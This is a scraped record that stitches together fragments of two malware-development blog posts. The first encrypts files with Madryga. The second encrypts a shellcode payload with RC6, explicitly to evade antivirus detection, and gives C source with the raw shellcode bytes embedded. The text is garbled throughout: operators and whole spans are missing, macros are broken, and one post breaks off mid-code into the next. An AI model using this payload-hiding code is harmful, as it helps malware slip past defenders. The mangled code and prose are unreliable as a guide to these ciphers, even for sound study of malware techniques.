      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n      \n\nSince I'm a little busy writing my book for the Packt publishing, I haven't been writing as often lately. i >= 0; i--) {\n    int working_frame_start = (i % data_len + data_len) % data_len;\n    int working_frame_mid = ((i + 1) % data_len + data_len) % data_len;\n    int working_frame_end = ((i + 2) % data_len + data_len) % data_len;\n\n    uint8_t rotation_bits = data[working_frame_end] & 0x07;\n\n    uint16_t temp = (uint16_t)data[working_frame_mid] > 8);\n    \n     data[working_frame_end] ^= (uint8_t) key;\n  }\n}\n\n// simplified inner cycle decryption (no key, no rounds)\nvoid madryga_inner_cycle_decrypt_simplified(unsigned char *data, int data_len, uint64_t key) {\n  for (int i = 0; i > 8);\n  }\n}\n\nvoid madryga_encrypt(unsigned char *plaintext, int plaintext_len, uint64_t key) {  \n  key ^= RANDOM_CONSTANT;\n  \n  for(int i=0; i  0) {\n    if (bytes_read  0) {\n    madryga_decrypt(buffer, key);\n    if (ftell(input_file) == EOF) {\n      // handle padding removal for the last block\n      int padding_start = BLOCK_SIZE - 1;\n      while (padding_start >= 0 && buffer[padding_start] == 0x90) {\n        padding_start--;\n      }\n      fwrite(buffer, 1, padding_start + 1, output_file);\n    } else {\n      fwrite(buffer, 1, BLOCK_SIZE, output_file);\n    }\n  }\n\n  fclose(input_file);\n  fclose(output_file);\n}\n```\n\nAs you can see, added padding (`0x90`) when the file size is not a multiple of the block size (`8 bytes`).     \n\nIn the `decrypt_file` function each block is decrypted as usual. If the file size is not a multiple of the block size, the last block will have padding. During decryption, the padding bytes (`0x90`) are removed to restore the original data. Also the padding bytes are identified by scanning the block from the end until a non-padding byte is found. Only the valid (non-padded) bytes are written for the last block.      \n\nA more robust padding scheme is `PKCS#7`, which appends n bytes of value n to make the block size complete. For example: If 3 bytes are missing to complete a block, add `0x03 0x03 0x03`. This ensures unique padding even if the data ends with bytes like `0x90`.       \n\nThe full source code is looks like this `hack.c`:    \n\n```cpp\n/*\n * hack.c\n * encrypt/decrypt file with Madryga algorithm\n * author: @cocomelonc\n * https://cocomelonc.github.io/malware/2024/01/16/malware-cryptography-24.html\n*/\n#include \n#include \n#include \n#include \n#include \n\n#define BLOCK_SIZE 8\n#define NUM_ROUNDS 8\nconst uint64_t RANDOM_CONSTANT = 0x0f1e2d3c4b5a6978;\nuint64_t key = 0x0123456789ABCDEF;\n\n// rotate left function for 16-bit integers\nuint16_t rotate_left_16(uint16_t value, int bits) {\n  return (value > (16 - bits));\n}\n\n// rotate right function for 16-bit integers\nuint16_t rotate_right_16(uint16_t value, int bits) {\n  return (value >> bits) | (value = 0;       "title": "Malware and cryptography 25: encrypt/decrypt payload via RC6. Simple C/C++ example.",
      "ref": "2024-02-21-malware-cryptography-25",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!        \n\n      \n\nIn one of my previous [posts](malware/2023/08/13/malware-cryptography-1.html) about cryptography in malware, I considered  RC5 encryption, one of the readers asked what would happen if I used RC6 encryption for my payload.    \n\nThis post is the result of my own research on try to evasion AV engines via encrypting payload with another logic: RC6. As usual, exploring various crypto algorithms, I decided to check what would happen if we apply this to encrypt/decrypt the payload.      \n\n### RC6\n\n**RC6** is a symmetric key algorithm for block encryption designed by Ron Rivest in 1998, four years after the proposal of its predecessor, the RC5 encryption algorithm.    \n\n### How it works?    \n\nRC6 uses a key expansion algorithm to generate round keys from the user-provided key. The key size can vary from `128 bits` to `256 bits`, making it highly secure.     \n\nThe encryption process involves iterating through a number of rounds, with each round performing a set of operations on the plaintext. In RC6, each round consists of four main steps: mixing, adding round key, rotation, and modular addition. The output of one round becomes the input for the next round.    \n\nThe decryption process is the reverse of the encryption process. The ciphertext is divided into blocks of 16 bytes each and decrypted using the round keys in reverse order.    \n\n### practical example\n\nLet's implement it. First of all, initializing `P` and `Q`. RC6 uses two word-sized constants, `P` and `Q`:    \n\n```cpp\n#define P32 0xB7E15163\n#define Q32 0x9E3779B9\n```\n\n`P32` is an arbitrary value derived from the mathematical constant `phi (φ)`, specifically `φ = (sqrt(5) - 1) / 2`. It is then multiplied by `2^32`.     \n`Q32` is another arbitrary value derived from the golden ratio constant (`ψ`), specifically `ψ = (sqrt(5) + 1) / 2`. It is then multiplied by `2^32`.     \n\n`ROTL` (Rotate Left) and `ROTR` (Rotate Right) are bitwise rotation operations. `ROTL` rotates the bits of a binary number to the left by a specified number of positions.     \n\n`ROTR` rotates the bits of a binary number to the right by a specified number of positions.     \n\n```cpp\n#define ROTL(x, y) (((x) > (W_BITS - (y & (W_BITS - 1)))))\n#define ROTR(x, y) (((x) >> (y & (W_BITS - 1))) | ((x)  (2 * L32) ? (2 * ROUNDS + 4) : (2 * L32)); s++, i = (i + 1) % (2 * ROUNDS + 4), j = (j + 1) % (2 * L32))\n    S[i] = ROTL((S[i] + A + B), 3), A = S[i] = ROTL((S[i] + A + B), (A + B)), B = L[j] = ROTL((L[j] + A + B), (A + B));\n  return;\n}\n```\n\nThe next one is the `rc6_encrypt` function. It takes the plaintext and the round keys generated during key expansion and applies the encryption algorithm to produce the ciphertext.Since we have the expanded key in the array `S`, we can perform the encryption algorithm as specified below. The registers are `A,B,C`, and `D` which hold both the input (plaintext) and output (ciphertext). Moreover, the first byte of the plaintext (or ciphertext) is placed in the least-significant byte of `A` while the last byte of the plaintext is placed in the most-significant byte of `D`:    \n\n```cpp\nvoid rc6_encrypt(const uint8_t pt[16], const WORD S[2 * ROUNDS + 4], uint8_t ct[16]) {\n  WORD A = *(WORD *)(pt + 0), B = *(WORD *)(pt + 4), C = *(WORD *)(pt + 8), D = *(WORD *)(pt + 12), t, u;\n  B += S[0], D += S[1];\n  for (int i = 1; i = 1; i--) {\n    t = D, D = C, C = B, B = A, A = t, u = ROTL(D * (2 * D + 1), 5), t = ROTL(B * (2 * B + 1), 5), C = ROTR(C - S[2 * i + 1], t) ^ u, A = ROTR(A - S[2 * i], u) ^ t;\n  }\n  D -= S[1], B -= S[0];\n  *(WORD *)(pt + 0) = A, *(WORD *)(pt + 4) = B, *(WORD *)(pt + 8) = C, *(WORD *)(pt + 12) = D;\n  return;\n}\n```\n\nFor simplicity I just implemented `20-round` encryption.    \n\nFinally, the full source code for encryption/decryption payload is:    \n\n```cpp\n/*\n * hack.c\n * RC6 implementation\n * author: @cocomelonc\n * https://cocomelonc.github.io/malware/2024/02/21/malware-cryptography-25.html\n*/\n#include \n#include \n#include \n#include \n#include \n\n#define WORD uint32_t\n#define W_BITS 32\n#define ROUNDS 20\n#define KEYLEN 16\n\n#define P32 0xB7E15163\n#define Q32 0x9E3779B9\n\n#define ROTL(x, y) (((x) > (W_BITS - (y & (W_BITS - 1)))))\n#define ROTR(x, y) (((x) >> (y & (W_BITS - 1))) | ((x)  (2 * L32) ? (2 * ROUNDS + 4) : (2 * L32)); s++, i = (i + 1) % (2 * ROUNDS + 4), j = (j + 1) % (2 * L32))\n    S[i] = ROTL((S[i] + A + B), 3), A = S[i] = ROTL((S[i] + A + B), (A + B)), B = L[j] = ROTL((L[j] + A + B), (A + B));\n\n  return;\n}\n\nvoid rc6_encrypt(const uint8_t pt[16], const WORD S[2 * ROUNDS + 4], uint8_t ct[16]) {\n  WORD A = *(WORD *)(pt + 0), B = *(WORD *)(pt + 4), C = *(WORD *)(pt + 8), D = *(WORD *)(pt + 12), t, u;\n  B += S[0], D += S[1];\n  for (int i = 1; i = 1; i--) {\n    t = D, D = C, C = B, B = A, A = t, u = ROTL(D * (2 * D + 1), 5), t = ROTL(B * (2 * B + 1), 5), C = ROTR(C - S[2 * i + 1], t) ^ u, A = ROTR(A - S[2 * i], u) ^ t;\n  }\n  D -= S[1], B -= S[0];\n  *(WORD *)(pt + 0) = A, *(WORD *)(pt + 4) = B, *(WORD *)(pt + 8) = C, *(WORD *)(pt + 12) = D;\n  return;\n}\n\nint main() {\n\n  uint8_t key[KEYLEN] = { 0x24, 0x3F, 0x6A, 0x88, 0x85, 0xA3, 0x08, 0xD3, 0x45, 0x28, 0x21, 0xE6, 0x38, 0xD0, 0x13, 0x77 };\n  WORD S[2 * ROUNDS + 4];\n  rc6_setup(key, S);\n\n  unsigned char data[] = {\n    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,\n    0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,\n    0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,\n    0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,\n    0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,\n    0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,\n    0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,\n    0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,\n    0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,\n    0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, "
